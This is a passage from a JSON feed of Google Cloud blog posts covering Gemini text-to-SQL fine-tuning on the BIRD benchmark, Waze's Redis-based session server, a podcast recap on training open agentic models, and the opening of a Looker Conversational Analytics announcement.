baseline;\">recipe</span><span style=\"vertical-align: baseline;\"> designed to transform the model from a general-purpose reasoner into a highly specialized SQL-generation expert.</span></p>\n<p><span style=\"vertical-align: baseline;\">This </span><span style=\"vertical-align: baseline;\">recipe</span><span style=\"vertical-align: baseline;\"> consisted of three critical phases applied </span><span style=\"font-style: italic; vertical-align: baseline;\">before</span><span style=\"vertical-align: baseline;\"> inference:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Rigorous data filtering:</strong><span style=\"vertical-align: baseline;\"> Ensuring the model learns from a flawless, \"gold standard\" dataset.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Multitask learning:</strong><span style=\"vertical-align: baseline;\"> Teaching the model not just to </span><span style=\"font-style: italic; vertical-align: baseline;\">translate</span><span style=\"vertical-align: baseline;\">, but to understand the implicit subtasks required for writing a correct SQL query.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Test-time scaling</strong><span style=\"vertical-align: baseline;\">: \u201cSelf consistency\u201d a.k.a., picking the best answer.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">\u00a0Let's break down each step.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2 - Our recipe\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_-_Our_recipe.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Our process for achieving SOTA result</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">Step 1: Start with a clean foundation (data filtering)</strong></p>\n<p><span style=\"vertical-align: baseline;\">One important tenet of fine-tuning is \"garbage in, garbage out.\" A model trained on a dataset with incorrect, inefficient, or ambiguous queries may learn incorrect patterns. The training data provided by the </span><a href=\"https://bird-bench.github.io/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BIRD</span></a><span style=\"vertical-align: baseline;\"> benchmark is\u00a0 powerful, but like most large-scale datasets, it's not perfect.</span></p>\n<p><span style=\"vertical-align: baseline;\">Before we could teach the model to be a SQL expert, we had to curate a gold-standard dataset. We used a rigorous two-stage pipeline: first, </span><strong style=\"vertical-align: baseline;\">execution-based validation</strong><span style=\"vertical-align: baseline;\"> to execute every query and discard any that failed, returned an error, or gave an empty result. Second, we used </span><strong style=\"vertical-align: baseline;\">LLM-based validation</strong><span style=\"vertical-align: baseline;\">, where multiple LLMs act as a \"judge\" to validate the semantic alignment between the question and the SQL, catching queries that run but don\u2019t </span><span style=\"font-style: italic; vertical-align: baseline;\">actually</span><span style=\"vertical-align: baseline;\"> answer the user's question. This aggressive filtering resulted in a smaller, cleaner, and more trustworthy dataset that helped our model learn from a signal of pure quality rather than noise.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Step 2: Make the model a SQL specialist (multitask learning)</strong></p>\n<p><span style=\"vertical-align: baseline;\">With a clean dataset, we could move on to the supervised fine-tuning itself. This is the process of taking a large, general-purpose model \u2014 in our case, Gemini 2.5-pro \u2014 and training it further on our narrow, specialized dataset to make it an expert in a specific task</span><strong style=\"vertical-align: baseline;\">.</strong></p>\n<p><strong style=\"vertical-align: baseline;\">To build these skills directly into the model, we leveraged the publicly available </strong><a href=\"https://cloud.google.com/vertex-ai/generative-ai/docs/models/gemini-use-supervised-tuning\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Supervised Tuning API for Gemini on Vertex AI</strong></a><strong style=\"vertical-align: baseline;\">.</strong><span style=\"vertical-align: baseline;\"> This service provided the foundation for our multitask supervised finetuning (SFT) approach, where we trained Gemini-2.5-pro on several distinct-but-related tasks simultaneously.</span></p>\n<p><span style=\"vertical-align: baseline;\">We also extended our training data to cover tasks outside of the main Text-to-SQL realm, helping enhance the model's reasoning, planning, and self-correction capabilities.</span></p>\n<p><span style=\"vertical-align: baseline;\">By training on this combination of tasks in parallel, the model learns a much richer, more robust set of skills. It goes beyond simple question-to-query mapping \u2014 it learns to deeply analyze the problem, plan its approach, and refine its own logic, leading to drastically improved accuracy and fewer errors.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Step 3: Inference accuracy + test-time scaling with self-consistency</strong></p>\n<p><span style=\"vertical-align: baseline;\">The final step was to ensure we could reliably pick the model's single best answer at test time. For this, we used a technique called </span><strong style=\"vertical-align: baseline;\">self-consistency</strong><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">With self-consistency, instead of asking the model for just one answer, we ask it to generate several query candidates for the same question. We then execute these queries, cluster them by their execution results, and select a representative query from the largest cluster. This approach is powerful because if the model arrives at the same answer through different reasoning paths, that answer has a much higher probability of being correct.</span></p>\n<p><span style=\"vertical-align: baseline;\">It's important to note that self-consistency is a standard, efficient method, but it is not the only way to select a query. More complex, agentic frameworks can achieve even higher accuracy. For example, our team's own research on </span><a href=\"https://arxiv.org/pdf/2410.01943\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">CHASE-SQL</strong></a><span style=\"vertical-align: baseline;\"> (our state-of-the-art ensembling methodology) demonstrates that using diverse candidate generators and a trained </span><span style=\"font-style: italic; vertical-align: baseline;\">selection agent</span><span style=\"vertical-align: baseline;\"> can significantly outperform consistency-based methods.</span></p>\n<p><span style=\"vertical-align: baseline;\">For this benchmark, we wanted to focus on the </span><strong style=\"vertical-align: baseline;\">model's core performance.</strong><span style=\"vertical-align: baseline;\"> Therefore, we used the more direct self-consistency method: we generated several queries, executed them, and selected a query from the group that produced the most common result. This approach allowed us to measure the model's raw text-to-SQL ability, minimizing the influence of a more complex filtering or reranking system.</span></p>\n<p><span style=\"vertical-align: baseline;\">The BIRD Single-Model Track explicitly allows for self-consistency, which reflects the model's own internal capabilities. The benchmark categorizes submissions based on the number of candidates used ('Few', 'Many', or 'Scale'). We found our \"sweet spot\" in the </span><strong style=\"vertical-align: baseline;\">\"Few\" (1-7 candidates) category.</strong></p>\n<p><span style=\"vertical-align: baseline;\">This approach gave us the final, critical boost in execution accuracy that pushed our model to the top of the leaderboard. More importantly, it proves our core thesis: by investing in high-quality data and instruction tuning, you can build a single model that is powerful enough to be production-ready without requiring a heavy, high-latency inference framework.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">A recipe for customizing Gemini for text-to-SQL</strong></h3>\n<p><span style=\"vertical-align: baseline;\">A combination of clean data, multi-task learning, and efficient self-consistency</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">allowed us to take the powerful Gemini 2.5-pro model and build a specialist that achieved the top-ranking score on the BIRD single-model benchmark.</span></p>\n<p><span style=\"vertical-align: baseline;\">Our fine-tuned model represents a much stronger baseline for text-to-SQL. However, it's important to note that this score is not the upper bound of accuracy. Rather, it is the new, higher baseline we have established for the core model's capability in a constrained setting. These results can be further amplified by either</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">creating an ensemble, aka integrating this specialist model into a broader system that employs preprocessing (like example retrieval) or agentic scaffolding (like our </span><a href=\"https://arxiv.org/pdf/2410.01943\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">CHASE-SQL</span></a><span style=\"vertical-align: baseline;\"> research), or</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">optimizing model quality for your unique database by enhancing metadata and/or query examples (which is how our customers typically deploy production workloads).\u00a0</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">Nevertheless, the insights from this research are actively informing how we build our next-generation AI-powered products for Google Data Cloud, and we\u2019ll continue to deliver these enhancements in our data services.\u00a0</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Explore advanced text-to-SQL capabilities today</strong></h3>\n<p><span style=\"vertical-align: baseline;\">We\u2019re constantly working to infuse our products with these state-of-the-art capabilities, starting with </span><a href=\"https://docs.cloud.google.com/alloydb/docs/ai/natural-language-landing\"><span style=\"text-decoration: underline; vertical-align: baseline;\">bringing natural language queries to applications built on AlloyDB and BigQuery</span></a><span style=\"vertical-align: baseline;\">. </span><span style=\"vertical-align: baseline;\">For AI-enhanced retrieval, customers especially value </span><a href=\"https://docs.cloud.google.com/alloydb/docs/ai/ai-query-engine-landing\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AlloyDB and its AI functions</span></a><span style=\"vertical-align: baseline;\">. AlloyDB integrates AI capabilities directly into the database, allowing developers to run powerful AI models using standard SQL queries without moving data. It offers specialized operators such as AI.IF() for intelligent filtering, AI.RANK() for semantic reranking of search results, and AI.GENERATE() for in-database text generation and data transformation.</span></p>\n<p><span style=\"vertical-align: baseline;\">And if you want to write some SQL yourself, </span><a href=\"https://docs.cloud.google.com/alloydb/docs/write-sql-gemini\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Code Assist</span></a><span style=\"vertical-align: baseline;\"> can help. With a simple prompt, you can instruct Gemini as to the query you want to create. Gemini will generate your code and you can immediately test it by executing it against your database. We look forward to hearing about what you build with it!</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"3 - Gemini code assist\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_-_Gemini_code_assist.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>",
        "published_date": "2025-11-14 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/databases/how-waze-keeps-traffic-flowing-with-memorystore/",
        "title": "Waze keeps traffic flowing with 1M+ real-time reads per second on Memorystore",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Waze-Memorystore-Hero.max-600x600.png",
        "author": "Yuval Kamran",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><strong style=\"font-style: italic; vertical-align: baseline;\">Editor\u2019s note: </strong><span style=\"font-style: italic; vertical-align: baseline;\">Waze (a division of Google parent company Alphabet) depends on vast volumes of dynamic, real-time user session data to power its core navigation features, but scaling that data to support concurrent users worldwide required a new approach. Their team built a centralized Session Server backed by </span><a href=\"https://cloud.google.com/memorystore\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">Memorystore for Redis Cluster</span></a><span style=\"font-style: italic; vertical-align: baseline;\">, a fully managed service with 99.99% availability that supports partial updates and easily scales to Waze\u2019s use case of over 1 million MGET commands per second with ~1ms latency. This architecture is the foundation for Waze\u2019s continued backend modernization.</span></p>\n<hr />\n<p><span style=\"vertical-align: baseline;\">Real-time data drives the Waze app experience. Our turn-by-turn guidance, accident rerouting, and driver alerts depend on up-to-the-millisecond accuracy. But keeping that experience seamless for millions of concurrent sessions requires robust and battle hardened infrastructure that is built to manage a massive stream of user session data. This includes active navigation routes, user location, and driver reports that can appear and evolve within seconds.</span></p>\n<p><span style=\"vertical-align: baseline;\">Behind the scenes, user sessions are large, complex objects that update frequently and contribute to an extremely high volume of read and write operations. Session data was once locked in a monolithic service, tightly coupled to a single backend instance. That made it hard to scale and blocked other microservices from accessing the real-time session state. To modernize, we needed a shared, low-latency solution that could handle these sessions in real time and at global scale. Memorystore for Redis Cluster made that possible.</span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Build smarter with Google Cloud databases!&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe6c13f9130&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Choosing the right route</strong></h3>\n<p><span style=\"vertical-align: baseline;\">As we planned the move to a microservices-based backend, we evaluated our options, including Redis Enterprise Cloud, a self-managed Redis cluster, or continuing with our existing Memcached via Memorystore deployment. In the legacy setup, Memcached stored session data behind the monolithic Realtime (RT) server, but it lacked the replication, advanced data types, and partial update capabilities we wanted. We knew Redis had the right capabilities, but managing it ourselves or through a third-party provider would add operational overhead.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Memorystore for Redis Cluster offered the best of both worlds. It\u2019s a fully managed service from Google Cloud with the performance, scalability, and resilience to meet Waze\u2019s real-time demands. It delivers a 99.99% SLA and a clustered architecture for horizontal scaling. With the database decision made, we planned a careful migration from Memcached to Memorystore for Redis using a dual-write approach. For a period, both systems were updated in parallel until data parity was confirmed. Then we cut over to Redis with zero downtime.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Waze\u2019s new data engine</strong></h3>\n<p><span style=\"vertical-align: baseline;\">From there, we built a centralized Session Server \u2013 our new command center for active user sessions \u2013 as a wrapper around Memorystore for Redis Cluster. This service became the single source of truth for all active user sessions, replacing the tight coupling between session data and the monolithic RT server. The Session Server exposes simple gRPC APIs, allowing any backend microservice to read from or write to the session state directly, including RT during the migration. This eliminated the need for client affinity, freed us from routing all session traffic through a single service, and made session data accessible across the platform.</span></p>\n<p><span style=\"vertical-align: baseline;\">We designed the system for resilience and scale from the ground up. Redis clustering and sharding remove single points of contention, letting us scale horizontally as demand grows. Built-in replication and automatic failover are designed to keep sessions online. While node replacements may briefly increase failure rates and latency for a short period, sessions are designed to stay online, allowing the navigation experience to quickly stabilize.</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">And with support for direct gRPC calls from the mobile client to any backend service, we can use more flexible design patterns while shaving precious milliseconds off the real-time path.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Fewer pit stops, faster rides</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Moving from Memcached\u2019s 99.9% SLA to Memorystore for Redis Cluster\u2019s 99.99% means higher availability and resiliency from the service. Load testing proved the new architecture can sustain full production traffic, comfortably handling bursts of up to 1 million MGET commands per second with a stable sub-millisecond service latency.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Because Memorystore for Redis supports partial updates, we can change individual fields within a session object rather than rewriting the entire record. That reduces network traffic, speeds up write performance, and makes the system more efficient overall \u2013 especially important when sessions can grow to many megabytes in size. These efficiencies translate directly into giving our engineering teams more time to focus on application-level performance and new feature development.</span></p>\n<p><span style=\"vertical-align: baseline;\">Session data in Memorystore for Redis Cluster is now integral to Waze\u2019s core features, from evaluating configurations to triggering real-time updates for drivers. It supports today\u2019s demands and is built to handle what\u2019s ahead.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">The road ahead</strong></h3>\n<p><span style=\"vertical-align: baseline;\">By proving Memorystore for Redis Cluster in one of Waze\u2019s most critical paths, we\u2019ve built the confidence to use it in other high-throughput caching scenarios across the platform. The centralized Session Server and clustered Redis architecture are now standard building blocks in our backend, which we can apply to new services without starting from scratch.</span></p>\n<p><span style=\"vertical-align: baseline;\">With that initial critical path complete, our next major focus is the migration of all remaining legacy session management from our RT server. This work will ultimately give every microservice independent access to update session data. Looking ahead, we're also focused on scaling Memorystore for Redis Cluster to meet future user growth and fine-tuning it for both cost and performance.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Learn more</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Waze\u2019s story showcases the power and flexibility of Memorystore for Redis Cluster, </span><span style=\"vertical-align: baseline;\">a fully managed service with 99.99% availability</span><span style=\"vertical-align: baseline;\"> for high-scale, real-time workloads.\u00a0</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Learn more about the power of </span><a href=\"https://cloud.google.com/memorystore\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Memorystore</span></a><span style=\"vertical-align: baseline;\"> and get started for free.\u00a0</span></p>\n</li>\n<li><a href=\"https://cloud.google.com/memorystore/docs/cluster\"><span style=\"text-decoration: underline; vertical-align: baseline;\">See Memorystore for Redis Cluster product documentation</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n</ul></div>",
        "published_date": "2025-11-14 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/agent-factory-recap-cracking-open-an-open-model/",
        "title": "Agent Factory Recap: Cracking Open an Open Model",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/The_Agent_Factory_Blog_-_Hero.max-600x600.png",
        "author": "Ivan Nardini",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Welcome back to </span><a href=\"https://www.youtube.com/playlist?list=PLIivdWyY5sqLXR1eSkiM5bE6pFlXC-OSs\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">The Agent Factory</span></a><span style=\"vertical-align: baseline;\">! In this episode, we\u2019re joined by Ravin Kumar, a Research Engineer at DeepMind, to tackle one of the biggest topics in AI right now: building and training open-source agentic models. We wanted to go beyond just </span><span style=\"font-style: italic; vertical-align: baseline;\">using</span><span style=\"vertical-align: baseline;\"> agents and understand what it takes to build the entire factory line\u2014from gathering data and supervised fine-tuning to reinforcement learning and evaluations.</span></p></div>\n<div class=\"block-video\">\n\n\n\n<div class=\"article-module article-video \">\n  <figure>\n    <a class=\"h-c-video h-c-video--marquee\" href=\"https://youtube.com/watch?v=7YgUDf_JXN8\">\n\n      \n        <img alt=\"A YouTube video explaining building and training open-source agentic models\" src=\"https://img.youtube.com/vi/7YgUDf_JXN8/maxresdefault.jpg\" />\n      \n      <svg class=\"h-c-video__play h-c-icon h-c-icon--color-white\" xmlns=\"http://www.w3.org/2000/svg\">\n        <use xlink:href=\"#mi-youtube-icon\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n      </svg>\n    </a>\n\n    \n  </figure>\n</div>\n\n<div class=\"h-c-modal--video\">\n   <a class=\"glue-yt-video\" href=\"https://youtube.com/watch?v=7YgUDf_JXN8\">\n   </a>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This post guides you through the key ideas from our conversation. Use it to quickly recap topics or dive deeper into specific segments with links and timestamps.</span></p>\n<h2><span style=\"vertical-align: baseline;\">The Agent Industry Pulse</span></h2>\n<p><span style=\"vertical-align: baseline;\">Timestamp: </span><a href=\"https://www.youtube.com/watch?v=7YgUDf_JXN8&amp;t=54s\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">2:00</span></a></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"image-1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image-1_ZfG9LL0.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Before diving into the deep research, we looked at the latest developments in the fast-moving world of AI agents.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://blog.google/technology/google-deepmind/gemini-computer-use-model/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini 2.5 Computer Use</span></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> Google's new model can act as a virtual user, interacting with computer screens, clicking buttons, typing in forms, and scrolling. It\u2019s a shift from agents that just know things to agents that can do tasks directly in a browser.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://blog.google/technology/developers/introducing-vibe-coding-in-google-ai-studio/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vibe Coding in AI Studio</span></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> A new approach to app building where you describe the \"vibe\" of the application you want, and the AI handles the boilerplate. It includes an Annotation Mode to refine specific UI elements with simple instructions like \"Change this to green.\"</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://arxiv.org/abs/2510.18234\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">DeepSeek-OCR and Context Compression</span></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> DeepSeek introduced a method that treats documents like images to understand layout, compressing 10-20 text tokens into a single visual token. This drastically improves speed and reduces cost for long-context tasks.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://blog.google/technology/ai/veo-updates-flow/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Veo 3.1 and Flow</span></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> The new update to the AI video model adds rich audio generation and powerful editing features. You can now use \"Insert\" to add characters or \"Remove\" to erase objects from existing video footage, giving creators iterative control.</span></p>\n</li>\n</ul>\n<h2><span style=\"vertical-align: baseline;\">Ravin Kumar on Building Open Models</span></h2>\n<p><span style=\"vertical-align: baseline;\">We sat down with Ravin to break down the end-to-end process of creating an open model with agent capabilities. It turns out the process mirrors a traditional ML lifecycle but with significantly more complex components.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Defining Agent Data</span></h3>\n<p><span style=\"vertical-align: baseline;\">Timestamp: </span><a href=\"https://youtu.be/7YgUDf_JXN8?si=r8PP24GP0o--DmQc&amp;t=895\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">14:55</span></a></p>\n<p><span style=\"vertical-align: baseline;\">Ravin explained that training data for agents looks vastly different from standard text datasets. It starts with identifying what users actually need. The data itself is a collection of trajectories, complex examples of the model making decisions and using tools. Ravin noted that they use a mix of human-curated data and synthetic data generated by their own internal \"teacher\" models and APIs to create a playground for the open models to learn in.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Training Techniques: SFT and Reinforcement Learning</span></h3>\n<p><span style=\"vertical-align: baseline;\">Timestamp: </span><a href=\"https://youtu.be/7YgUDf_JXN8?si=lGRLwhn00IBx5Vj0&amp;t=1034\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">17:14</span></a><span style=\"vertical-align: baseline;\">\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Once the data is ready, the training process involves a two-phase approach. First comes Supervised Fine-Tuning (SFT), where frameworks update the model's weights to nudge it into new behaviors based on the examples. However, to handle generalization\u2014new situations not in the original trainin data\u2014they rely on Reinforcement Learning (RL). Ravin highlighted the difficulty of setting rewards in RL, warning that models are prone to \"reward hacking,\" where they might collect intermediate rewards without ever completing the final task.</span></p>\n<h3><span style=\"vertical-align: baseline;\">The Stakes of Evaluation</span></h3>\n<p><span style=\"vertical-align: baseline;\">Timestamp: </span><a href=\"https://youtu.be/7YgUDf_JXN8?si=CiWVnqgYaDPV3MV7&amp;t=1211\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">20:10</span></a></p>\n<p><span style=\"vertical-align: baseline;\">Ravin emphasized that evaluation is the most critical and high-stakes part of the process. You can't just trust the training process; you need a rigorous \"final exam.\" They use a combination of broad public benchmarks to measure general capability and specific, custom evaluations to ensure the model is safe and effective for its intended user use case.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Conclusion</span></h2>\n<p><span style=\"vertical-align: baseline;\">This conversation with Ravin Kumar really illuminated that building open agentic models is a highly structured, rigorous process. It requires creating high-quality trajectories for data, a careful combination of supervised and reinforcement learning, and, crucially, intense evaluation.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Your turn to build</span></h2>\n<p><span style=\"vertical-align: baseline;\">As Ravin advised, the best place to start is at the end. Before you write a single line of training code, define what success looks like by building a small, 50-example final exam for your agent. If you can't measure it, you can't improve it. We also encourage you to try mixing different approaches; for example, using a powerful API model like Gemini as a router and a specialized open-source model for specific tasks.</span></p>\n<p><span style=\"vertical-align: baseline;\">Check out the full episode for more details, and catch us next time!</span></p>\n<h2><span style=\"vertical-align: baseline;\">Connect with us</span></h2>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Ivan Nardini \u2192 </span><a href=\"https://www.linkedin.com/in/ivan-nardini/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LinkedIn</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://x.com/ivnardini\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">X</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://bsky.app/profile/ivnardini.bsky.social\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Bsky</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Amit Maraj \u2192 </span><a href=\"https://www.linkedin.com/in/amit-maraj/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LinkedIn</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://x.com/agenticamit\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">X</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://www.tiktok.com/@agenticamit\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">TikTok</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Ravin Kumar \u2192 </span><a href=\"https://www.linkedin.com/in/ravinakumar/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LinkedIn</span></a></p>\n</li>\n</ul></div>",
        "published_date": "2025-11-14 10:03:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/business-intelligence/looker-conversational-analytics-now-ga/",
        "title": "Talk with and trust your data using Looker\u2019s Conversational Analytics, now GA",
        "thumbnail": null,
        "author": "Richard Kuzma",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In a world of increasing data volume and demand, businesses are looking to make faster decisions and separate insight from noise. Today, we\u2019re bringing </span><a href=\"https://docs.cloud.google.com/looker/docs/conversational-analytics-overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Conversational Analytics</span></a><span style=\"vertical-align: baseline;\"> to general availability in </span><a href=\"https://cloud.google.com/looker\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Looker</span></a><span style=\"vertical-align: baseline;\">, delivering natural language queries to everyone in your organization, removing BI bottlenecks. With Conversational Analytics, we\u2019re transforming the way you get answers, cutting through stale dashboards and accelerating data discovery. Our goal: make analytics and AI as easy and scalable as performing a Google search, extending BI to the broader enterprise as you go from prompt to full data exploration in seconds.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/1_jkplT4C.gif\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Instant AI-powered insights with Conversational Analytics in Looker</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">We announced the </span><a href=\"https://cloud.google.com/blog/products/data-analytics/looker-bi-platform-gets-ai-powered-data-exploration\"><span style=\"text-decoration: underline; vertical-align: baseline;\">preview of Conversational Analytics at Google Cloud Next</span></a><span style=\"vertical-align: baseline;\"> in April. Since then, we\u2019ve also extended the ability to leverage Google\u2019s latest Gemini models with your own custom applications through the </span><a href=\"https://cloud.google.com/blog/products/data-analytics/understanding-lookers-conversational-analytics-api\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Conversational Analytics API</span></a><span style=\"vertical-align: baseline;\">, showcased productivity improvements that come from the </span><a href=\"https://cloud.google.com/blog/products/data-analytics/gemini-in-looker-deep-dive\"><span style=\"text-decoration: underline; vertical-align: baseline;\">convergence of AI and BI</span></a><span style=\"vertical-align: baseline;\">, and empowered today\u2019s modern </span><a href=\"https://cloud.google.com/blog/products/business-intelligence/a-closer-look-at-looker-conversational-analytics\"><span style=\"text-decoration: underline; vertical-align: baseline;\">data analysts and developers</span></a><span style=\"vertical-align: baseline;\"> to do more, faster.</span></p>\n<p><span style=\"vertical-align: baseline;\">Now, with Conversational Analytics, getting an answer from your data is as simple as chatting with your most 